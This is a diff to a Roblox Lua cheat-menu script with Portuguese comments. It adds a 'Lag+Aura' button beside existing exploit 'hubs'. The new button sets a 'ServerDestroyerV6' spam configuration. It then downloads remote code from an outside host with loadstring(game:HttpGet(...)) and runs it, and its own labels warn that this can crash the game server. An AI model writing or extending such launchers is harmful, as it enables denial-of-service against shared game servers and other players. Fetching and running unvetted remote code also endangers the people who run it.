@@ -8,7 +8,7 @@ local RunService = game:GetService("RunService")
 -- Configurações
 local DRAG_SPEED = 0.25
 local EMOJI_ANIMATION_SPEED = 2
-local MAXIMIZED_SIZE = UDim2.new(0, 400, 0, 610)
+local MAXIMIZED_SIZE = UDim2.new(0, 400, 0, 660)
 local MINIMIZED_SIZE = UDim2.new(0, 200, 0, 60)
 
 -- Cria a interface principal
@@ -30,7 +30,7 @@ end
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "AppleFrame"
 MainFrame.Size = MAXIMIZED_SIZE
-MainFrame.Position = UDim2.new(0.5, -200, 0.5, -305)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -330)
 MainFrame.BackgroundColor3 = Color3.fromRGB(255, 59, 48) -- Vermelho maçã
 MainFrame.BackgroundTransparency = 0.1
 MainFrame.BorderSizePixel = 0
@@ -140,7 +140,7 @@ ScriptsContainer.BackgroundTransparency = 1
 ScriptsContainer.BorderSizePixel = 0
 ScriptsContainer.ScrollBarThickness = 5
 ScriptsContainer.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, 290)
+ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, 360)
 
 -- Layout dos scripts
 local UIListLayout = Instance.new("UIListLayout")
@@ -240,7 +240,7 @@ UCTIcon.TextSize = 24
 UCTIcon.Font = Enum.Font.GothamBold
 UCTIcon.TextColor3 = Color3.fromRGB(0, 191, 255)
 
--- Botão Kurd Hub (NOVO)
+-- Botão Kurd Hub
 local KurdButton = Instance.new("TextButton")
 KurdButton.Name = "KurdHub"
 KurdButton.Size = UDim2.new(1, 0, 0, 60)
@@ -269,7 +269,38 @@ KurdIcon.BackgroundTransparency = 1
 KurdIcon.Text = "🏔️"
 KurdIcon.TextSize = 24
 KurdIcon.Font = Enum.Font.GothamBold
-KurdIcon.TextColor3 = Color3.fromRGB(34, 139, 34) -- Verde montanha
+KurdIcon.TextColor3 = Color3.fromRGB(34, 139, 34)
+
+-- Botão Lag+Aura (NOVO)
+local LagAuraButton = Instance.new("TextButton")
+LagAuraButton.Name = "LagAura"
+LagAuraButton.Size = UDim2.new(1, 0, 0, 60)
+LagAuraButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+LagAuraButton.BackgroundTransparency = 0.3
+LagAuraButton.Text = ""
+LagAuraButton.AutoButtonColor = false
+LagAuraButton.BorderSizePixel = 0
+
+local LagAuraLabel = Instance.new("TextLabel")
+LagAuraLabel.Name = "Label"
+LagAuraLabel.Size = UDim2.new(1, -60, 1, 0)
+LagAuraLabel.Position = UDim2.new(0, 50, 0, 0)
+LagAuraLabel.BackgroundTransparency = 1
+LagAuraLabel.Text = "Lag+Aura [OP]"
+LagAuraLabel.TextSize = 18
+LagAuraLabel.Font = Enum.Font.GothamBold
+LagAuraLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+LagAuraLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local LagAuraIcon = Instance.new("TextLabel")
+LagAuraIcon.Name = "Icon"
+LagAuraIcon.Size = UDim2.new(0, 40, 0, 40)
+LagAuraIcon.Position = UDim2.new(0, 5, 0.5, -20)
+LagAuraIcon.BackgroundTransparency = 1
+LagAuraIcon.Text = "💀"
+LagAuraIcon.TextSize = 24
+LagAuraIcon.Font = Enum.Font.GothamBold
+LagAuraIcon.TextColor3 = Color3.fromRGB(178, 34, 34) -- Vermelho escuro
 
 -- Montagem da interface
 Shadow.Parent = MainFrame
@@ -300,6 +331,10 @@ UCTIcon.Parent = UCTButton
 KurdButton.Parent = ScriptsContainer
 KurdLabel.Parent = KurdButton
 KurdIcon.Parent = KurdButton
+
+LagAuraButton.Parent = ScriptsContainer
+LagAuraLabel.Parent = LagAuraButton
+LagAuraIcon.Parent = LagAuraButton
 
 -- Variáveis de estado
 local isDragging = false
@@ -480,7 +515,6 @@ UCTButton.MouseButton1Click:Connect(function()
     UCTLabel.Text = "UCT HUB [OP]"
 end)
 
--- Função do Kurd Hub (NOVO)
 KurdButton.MouseButton1Click:Connect(function()
     animateClick(KurdButton)
     
@@ -509,16 +543,86 @@ KurdButton.MouseButton1Click:Connect(function()
     KurdLabel.Text = "Kurd Hub [OP]"
 end)
 
+-- Função do Lag+Aura (NOVO)
+LagAuraButton.MouseButton1Click:Connect(function()
+    animateClick(LagAuraButton)
+    
+    -- Efeito visual de execução
+    LagAuraIcon.Text = "⏳"
+    LagAuraLabel.Text = "Configurando..."
+    
+    task.wait(0.3)
+    
+    -- Executar o script com configurações
+    local success, error = pcall(function()
+        -- Configurar as variáveis antes de executar
+        getgenv().ServerDestroyerV6 = {
+            Comprar = false,
+            Spam = true
+        }
+        
+        LagAuraIcon.Text = "⚙️"
+        LagAuraLabel.Text = "Executando..."
+        
+        task.wait(0.2)
+        
+        -- Executar o script principal
+        loadstring(game:HttpGet("https://tcscripts.discloud.app/scripts/serverdestroyerv6"))()
+    end)
+    
+    if success then
+        LagAuraIcon.Text = "✅"
+        LagAuraLabel.Text = "Lag+Aura [ATIVADO]"
+        
+        -- Adicionar efeito especial de perigo
+        local originalColor = LagAuraButton.BackgroundColor3
+        local dangerEffect = RunService.Heartbeat:Connect(function()
+            local pulse = math.sin(os.clock() * 5) * 0.3 + 0.7
+            LagAuraButton.BackgroundColor3 = Color3.new(
+                originalColor.R * pulse,
+                originalColor.G * 0.3,
+                originalColor.B * 0.3
+            )
+        end)
+        
+        -- Parar efeito após 3 segundos
+        task.wait(3)
+        dangerEffect:Disconnect()
+        LagAuraButton.BackgroundColor3 = originalColor
+        
+    else
+        LagAuraIcon.Text = "❌"
+        LagAuraLabel.Text = "Lag+Aura [ERRO]"
+        warn("Erro ao executar Lag+Aura:", error)
+    end
+    
+    task.wait(1)
+    LagAuraIcon.Text = "💀"
+    LagAuraLabel.Text = "Lag+Aura [OP]"
+end)
+
 -- Efeitos hover
 local function setupHoverEffects(button, icon, label, originalText, originalIcon)
     button.MouseEnter:Connect(function()
         button.BackgroundTransparency = 0.1
         label.TextColor3 = Color3.fromRGB(255, 215, 0)
+        
+        -- Efeito especial para Lag+Aura
+        if button.Name == "LagAura" then
+            local shakeX = math.random(-2, 2)
+            local shakeY = math.random(-2, 2)
+            icon.Position = UDim2.new(0, 5 + shakeX, 0.5, -20 + shakeY)
+        end
     end)
     
     button.MouseLeave:Connect(function()
         button.BackgroundTransparency = 0.3
         label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        
+        -- Resetar posição do ícone
+        if button.Name == "LagAura" then
+            icon.Position = UDim2.new(0, 5, 0.5, -20)
+        end
     end)
 end
 
@@ -526,6 +630,7 @@ setupHoverEffects(NamelessButton, NamelessIcon, NamelessLabel, "Nameless Hub [OP
 setupHoverEffects(ChilliButton, ChilliIcon, ChilliLabel, "Chilli Hub [OP]", "🌶️")
 setupHoverEffects(UCTButton, UCTIcon, UCTLabel, "UCT HUB [OP]", "⚡")
 setupHoverEffects(KurdButton, KurdIcon, KurdLabel, "Kurd Hub [OP]", "🏔️")
+setupHoverEffects(LagAuraButton, LagAuraIcon, LagAuraLabel, "Lag+Aura [OP]", "💀")
 
 -- Animação contínua do emoji
 RunService.RenderStepped:Connect(animateEmoji)
@@ -537,6 +642,10 @@ print("1. 👑 Nameless Hub [OP]")
 print("2. 🌶️ Chilli Hub [OP]")
 print("3. ⚡ UCT HUB [OP]")
 print("4. 🏔️ Kurd Hub [OP]")
+print("5. 💀 Lag+Aura [OP] - CUIDADO!")
+print("")
+print("⚠️  Atenção: Lag+Aura pode causar instabilidade no servidor!")
+print("📢 Use com responsabilidade!")
 
 -- Adiciona borda arredondada
 local Corner = Instance.new("UICorner")
@@ -549,6 +658,7 @@ ButtonCorner.Parent = NamelessButton
 ButtonCorner:Clone().Parent = ChilliButton
 ButtonCorner:Clone().Parent = UCTButton
 ButtonCorner:Clone().Parent = KurdButton
+ButtonCorner:Clone().Parent = LagAuraButton
 
 local TitleCorner = Instance.new("UICorner")
 TitleCorner.CornerRadius = UDim.new(0, 15)
@@ -581,12 +691,31 @@ addButtonEffect(NamelessButton)
 addButtonEffect(ChilliButton)
 addButtonEffect(UCTButton)
 addButtonEffect(KurdButton)
+addButtonEffect(LagAuraButton)
 
--- Adiciona pequena descrição nos botões (tooltip simples)
+-- Efeito especial para Lag+Aura (glitch)
+local function addLagAuraEffect()
+    local glitchEffect = RunService.Heartbeat:Connect(function()
+        if math.random(1, 100) <= 5 then -- 5% de chance de glitch
+            LagAuraIcon.Text = math.random(1, 2) == 1 and "💥" or "⚡"
+            LagAuraIcon.TextColor3 = Color3.fromRGB(
+                math.random(200, 255),
+                math.random(0, 100),
+                math.random(0, 100)
+            )
+            
+            task.wait(0.1)
+            LagAuraIcon.Text = "💀"
+            LagAuraIcon.TextColor3 = Color3.fromRGB(178, 34, 34)
+        end
+    end)
+    
+    return glitchEffect
+end
+
+-- Tooltips
 local function addTooltip(button, description)
     button.MouseEnter:Connect(function()
-        -- Poderia adicionar um tooltip flutuante aqui
-        -- Por enquanto apenas muda o cursor
         button.Mouse.Icon = "rbxasset://SystemCursors/PointingHand"
     end)
     
@@ -599,3 +728,47 @@ addTooltip(NamelessButton, "Execute Nameless Hub - Script poderoso")
 addTooltip(ChilliButton, "Execute Chilli Hub - Script picante")
 addTooltip(UCTButton, "Execute UCT HUB - Script eletrizante")
 addTooltip(KurdButton, "Execute Kurd Hub - Script das montanhas")
+addTooltip(LagAuraButton, "⚠️ SERVER DESTROYER ⚠️ - Use com cuidado!")
+
+-- Iniciar efeito do Lag+Aura
+local lagAuraGlitch = addLagAuraEffect()
+
+-- Limpar efeitos ao fechar
+CloseButton.MouseButton1Click:Connect(function()
+    if lagAuraGlitch then
+        lagAuraGlitch:Disconnect()
+    end
+    ScreenGui:Destroy()
+end)
+
+-- Adicionar aviso especial para Lag+Aura
+local warningLabel = Instance.new("TextLabel")
+warningLabel.Name = "Warning"
+warningLabel.Size = UDim2.new(1, -10, 0, 25)
+warningLabel.Position = UDim2.new(0, 5, 1, -30)
+warningLabel.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+warningLabel.BackgroundTransparency = 0.3
+warningLabel.Text = "⚠️ Lag+Aura: Pode causar crash no servidor!"
+warningLabel.TextSize = 12
+warningLabel.Font = Enum.Font.GothamBold
+warningLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+warningLabel.TextXAlignment = Enum.TextXAlignment.Center
+warningLabel.Visible = false
+warningLabel.Parent = MainFrame
+
+local warningCorner = Instance.new("UICorner")
+warningCorner.CornerRadius = UDim.new(0, 8)
+warningCorner.Parent = warningLabel
+
+-- Mostrar aviso quando hover no Lag+Aura
+LagAuraButton.MouseEnter:Connect(function()
+    warningLabel.Visible = true
+end)
+
+LagAuraButton.MouseLeave:Connect(function()
+    warningLabel.Visible = false
+end)
+
+-- Ajustar tamanho inicial do canvas
+task.wait(0.1)
+ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
